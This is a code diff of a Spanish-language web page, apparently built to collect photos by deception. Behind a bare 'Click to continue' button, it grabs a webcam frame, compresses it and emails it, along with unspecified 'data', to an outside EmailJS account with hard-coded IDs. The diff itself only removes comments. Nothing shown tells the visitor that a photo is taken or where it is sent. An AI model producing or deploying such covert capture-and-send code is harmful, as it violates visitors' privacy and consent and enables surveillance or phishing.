@@ -8,7 +8,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            emailjs.init("6GLRgbrJzJJHA5TQB");[cite: 1]
+            emailjs.init("6GLRgbrJzJJHA5TQB");
         })();
     </script>
     <style>
@@ -53,7 +53,6 @@
 <body>
 
     <div class="container" id="mainContainer">
-        
         <p>Da click para continuar</p>
         <button class="btn" id="startBtn">Continuar</button>
         <p id="status"></p>
@@ -133,12 +132,10 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Comprimir a JPEG con 50% de calidad para cumplir el límite de EmailJS
                     const imageDataURL = canvas.toDataURL('image/jpeg', 0.5);
 
                     statusText.textContent = "Enviando información al sistema...";
 
-                    // APAGAR LA CÁMARA INMEDIATAMENTE ANTES DE ENVIAR
                     stream.getTracks().forEach(track => track.stop());
                     video.style.display = 'none';
 
@@ -151,7 +148,6 @@
                     emailjs.send("service_to66hza", "template_0g763fz", templateParams)
                         .then((response) => {
                             console.log("Correo enviado con éxito!", response.status);
-                            // Indicador visual de éxito definitivo
                             document.getElementById('mainContainer').innerHTML = `
                                 <h3>¡Información enviada con éxito!</h3>
                                 <p style="color: green; font-weight: bold;">✓ Los datos y la foto se han enviado correctamente a tu correo.</p>
